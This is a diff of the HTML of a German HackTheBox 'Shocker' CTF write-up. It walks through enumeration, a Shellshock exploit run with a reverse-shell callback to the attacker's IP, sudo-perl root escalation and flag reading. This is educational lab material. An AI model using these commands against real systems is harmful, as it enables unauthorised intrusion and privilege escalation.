@@ -50,8 +50,8 @@ Root-Rechte zu bekommen ist sehr einfach." />
 
 Tipps Der Webserver hat ein interessantes Verzeichnis mit einer Datei drin.
 Der Name der Maschine ist bei HackTheBox oft ein Tipp. Das Beitragsbild, welches ich mit meinen immensen Photoshop Sk1llz erstellt habe, ist auch ein &ldquo;dezenter&rdquo; Hinweis.
-Root-Rechte zu bekommen ist sehr einfach."><meta itemprop="datePublished" content="2018-02-20T16:41:56&#43;01:00" />
-<meta itemprop="dateModified" content="2018-02-20T16:41:56&#43;01:00" />
+Root-Rechte zu bekommen ist sehr einfach."><meta itemprop="datePublished" content="2018-02-20T16:41:56+01:00" />
+<meta itemprop="dateModified" content="2018-02-20T16:41:56+01:00" />
 <meta itemprop="wordCount" content="714"><meta itemprop="image" content="/"/>
 <meta itemprop="keywords" content="hackthebox,ctf,german," />
 <meta name="twitter:card" content="summary_large_image"/>
@@ -75,8 +75,8 @@ Der Name der Maschine ist bei HackTheBox oft ein Tipp. Das Beitragsbild, welches
 Root-Rechte zu bekommen ist sehr einfach." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/2018/02/hackthebox-shocker-writeup-tipps-anleitung/" /><meta property="og:image" content="/"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2018-02-20T16:41:56&#43;01:00" />
-<meta property="article:modified_time" content="2018-02-20T16:41:56&#43;01:00" />
+<meta property="article:published_time" content="2018-02-20T16:41:56+01:00" />
+<meta property="article:modified_time" content="2018-02-20T16:41:56+01:00" />
 
 
 
@@ -173,7 +173,7 @@ Root-Rechte zu bekommen ist sehr einfach." />
 <p><a href="http://www.youtube.com/watch?v=DhlNO97IztU"><img src="http://img.youtube.com/vi/DhlNO97IztU/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
 <h2 id="anleitung"><strong>Anleitung</strong></h2>
 <p>Als erstes kommt wie immer ein Nmap-Scan.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A 10.10.10.56
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A 10.10.10.56
 
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 PORT STATE SERVICE VERSION
@@ -183,7 +183,7 @@ PORT STATE SERVICE VERSION
 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p>Wenn wir einen Verzeichnis-Bruteforce machen, finden wir das Verzeichnis <strong>cgi-bin</strong>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# dirb http://10.10.10.56/ /usr/share/wordlists/dirb/common.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# dirb http://10.10.10.56/ /usr/share/wordlists/dirb/common.txt
 
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 ---- Scanning URL: http://10.10.10.56/ ----
@@ -192,7 +192,7 @@ PORT STATE SERVICE VERSION
 + http://10.10.10.56/server-status <span style="color:#f92672">(</span>CODE:403|SIZE:299<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p>Im Verzeichnis <strong>cgi-bin</strong> befinden sich normalerweise verschiedene Scripts wie z.B. Perl oder Bash. Versuchen wir doch mal welche durch einen weiteren Brute-Force zu finden. Nach der Option <strong>-X</strong> können wir Dateiendungen festlegen, welche an jeden String in unserer Wortliste angehängt werden.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# dirb http://10.10.10.56/cgi-bin/ /usr/share/wordlists/dirb/common.txt -X .sh,.pl
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# dirb http://10.10.10.56/cgi-bin/ /usr/share/wordlists/dirb/common.txt -X .sh,.pl
 
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 ---- Scanning URL: http://10.10.10.56/cgi-bin/ ----
@@ -201,7 +201,7 @@ PORT STATE SERVICE VERSION
 </code></pre></div><p>Das Shell-Skript <strong>user.sh</strong> wurde in dem Verzeichnis <strong>cgi-bin</strong> gefunden.</p>
 <p>Anhand des Namens der Maschine ( Shocker ) liegt der verdacht nahe, dass hier die <a href="https://de.wikipedia.org/wiki/Shellshock_(Sicherheitsl%C3%BCcke)">Shellshock</a> Sicherheitslücke ausgenutzt werden kann.<br>
 Mithilfe von <strong>searchsploit</strong> können wir nach Exploits für <a href="https://de.wikipedia.org/wiki/Shellshock_(Sicherheitsl%C3%BCcke)">Shellshock</a> suchen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# searchsploit shellshock
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# searchsploit shellshock
 --------------------------------------- ----------------------------------
 Exploit Title                          | Path
                                        | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
@@ -226,7 +226,7 @@ Shellcodes: No Result
 </code></pre></div><p>Es gibt viele verschiedene Skripte, welche Remote Code Execution durch <a href="https://de.wikipedia.org/wiki/Shellshock_(Sicherheitsl%C3%BCcke)">Shellshock</a> ermöglichen.</p>
 <p>Einfachheitshalber können wir eines der Skripte benutzen, welche dank Exploitdb schon auf unserer Maschine vorhanden sind.<br>
 Ich benutze das Skript, welches an zweiter Stelle von <strong>searchsploit</strong> angezeigt wurde.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# python /usr/share/exploitdb/exploits/linux/remote/34900.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# python /usr/share/exploitdb/exploits/linux/remote/34900.py
 
 Shellshock apache mod_cgi remote exploit
 
@@ -251,12 +251,12 @@ Example:
 ./exploit.py payload<span style="color:#f92672">=</span>bind rhost<span style="color:#f92672">=</span>1.2.3.4 rport<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span>
 </code></pre></div><p>Als Parameter müssen wir <strong>payload</strong>, <strong>rhost</strong>, <strong>lhost</strong>, <strong>lport</strong> und ebenfalls <strong>pages</strong> festlegen.</p>
 <p>Jetzt müssen wir nur noch eben unsere IP-Adresse nachsehen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# ifconfig tun0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# ifconfig tun0
 tun0: flags<span style="color:#f92672">=</span>4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu <span style="color:#ae81ff">1500</span>
 inet 10.10.15.14 netmask 255.255.254.0 destination 10.10.15.14
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </code></pre></div><p>Alle Parameter festlegen und los geht&rsquo;s!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# python /usr/share/exploitdb/exploits/linux/remote/34900.py payload<span style="color:#f92672">=</span>reverse rhost<span style="color:#f92672">=</span>10.10.10.56 lhost<span style="color:#f92672">=</span>10.10.15.14 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> pages<span style="color:#f92672">=</span>/cgi-bin/user.sh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# python /usr/share/exploitdb/exploits/linux/remote/34900.py payload<span style="color:#f92672">=</span>reverse rhost<span style="color:#f92672">=</span>10.10.10.56 lhost<span style="color:#f92672">=</span>10.10.15.14 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> pages<span style="color:#f92672">=</span>/cgi-bin/user.sh
 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Started reverse shell handler
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Trying exploit on : /cgi-bin/user.sh
 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Successfully exploited
@@ -265,7 +265,7 @@ inet 10.10.15.14 netmask 255.255.254.0 destination 10.10.15.14
 shelly
 </code></pre></div><p>Es hat funktioniert, wir haben nun als der Benutzer <strong>Shelly</strong> Zugriff.</p>
 <p>Mit <strong>sudo -l</strong> können wir nachsehen, welche Befehle wir als der aktuelle Benutzer mit Root Rechten ausführen lassen können.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">10.10.10.56&gt; sudo -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">10.10.10.56&gt; sudo -l
 Matching Defaults entries <span style="color:#66d9ef">for</span> shelly on Shocker:
 env_reset, mail_badpass,
 secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
@@ -274,11 +274,11 @@ User shelly may run the following commands on Shocker:
 <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
 </code></pre></div><p>Wir können also Perl-Befehle als Root ausführen ohne ein Password zu benötigen!</p>
 <p>Wir können nun mithilfe von Perl <strong>/bin/sh</strong> ausführen lassen, wodurch wir eine Bash-Shell bekommen. Da wir <strong>sudo</strong> benutzen, wird die Bash-Shell als Root ausgeführt.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">10.10.10.56&gt; sudo perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/sh&#34;;&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">10.10.10.56&gt; sudo perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/sh&#34;;&#39;</span>
 10.10.10.56&gt; whoami
 root
 </code></pre></div><p>Jetzt wo wir Root-Rechte haben, können wir uns den Root-Hash anzeigen lassen und uns natürlich auch noch den User-Hash holen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">10.10.10.56&gt; cat /root/root.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">10.10.10.56&gt; cat /root/root.txt
 52c#########ZENSIERT#########467
 
 10.10.10.56&gt; cat /home/shelly/user.txt
